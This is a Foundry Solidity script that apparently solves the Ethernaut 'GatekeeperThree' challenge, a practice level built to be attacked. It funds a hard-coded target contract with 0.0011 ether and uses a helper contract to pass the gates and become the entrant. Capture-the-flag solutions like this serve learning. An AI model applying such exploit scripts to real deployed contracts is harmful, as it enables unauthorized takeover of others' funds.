// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {GateunlockerThree} from "src/GatekeeperThree/GateunlockerThree.sol";
import {GatekeeperThree} from "src/GatekeeperThree/GatekeeperThree.sol";

contract GatekeeperThreeScript is Script {
    function run() external {
        vm.startBroadcast(0x777dcCD91f7C62717DBa44db3504bDf47C75E2F1);

        address payable _target = payable(
            0x552f6218CCc3Dd938AFc7FBCC92b7b3B23B33Ee2
        );
        GateunlockerThree unlocker = new GateunlockerThree();
        GatekeeperThree target = GatekeeperThree(_target);

        (bool success, ) = address(target).call{value: 0.0011 ether}("");
        require(
            success && address(target).balance > 0.001 ether,
            "transfer failed"
        );

        unlocker.unlock(target);
        require(target.entrant() == 0x777dcCD91f7C62717DBa44db3504bDf47C75E2F1);

        vm.stopBroadcast();
    }
}
